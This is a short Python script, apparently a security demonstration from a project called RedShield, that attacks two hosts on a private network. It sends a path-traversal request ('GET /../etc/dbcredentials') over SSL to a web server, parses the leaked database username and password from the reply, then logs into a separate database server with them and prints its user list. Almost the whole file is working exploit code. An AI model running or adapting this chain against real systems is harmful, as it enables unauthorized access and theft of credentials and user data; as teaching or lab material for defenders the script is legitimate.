# -*- coding: cp1252 -*-
#https://github.com/nerfuxion/sslsecurity
#RedShield - Written by Fredrik Söderlund
#www.redshield.co
import socket, ssl

webServerHost = "10.0.5.22"
webServerPort = 443
webServerAttackString = "GET /../etc/dbcredentials HTTP/1.1"


dbHost = "10.0.0.22"
dbPort = 1234



#Stage 1 - Exploit Web Server Vulnerability to extract database credentials
initialSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
webServerSocket = ssl.wrap_socket(initialSocket, ssl_version=ssl.PROTOCOL_SSLv23, ciphers="ADH-AES256-SHA")
webServerSocket.connect((webServerHost, webServerPort))

webServerSocket.send(bytes(webServerAttackString, 'ascii'))
response = webServerSocket.recv(1024)
webServerSocket.close()
initialSocket.close()

response = str(response, 'ascii')

dbCredentials = response.split(":")
userName = dbCredentials[0]
userPassword = dbCredentials[1]

#Stage 2 - Use extracted database credentials to read userlist directly from database
dbSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
dbSocket.connect((dbHost, dbPort))

dbSocket.send(bytes(userName, 'ascii'), len(userName))
response = dbSocket.recv(1024)
    
dbSocket.send(bytes(userPassword, 'ascii'), len(userPassword))
response = dbSocket.recv(1024)

response = dbSocket.recv(1024)
dbSocket.close()
    
response = str(response, 'ascii')

print(response)

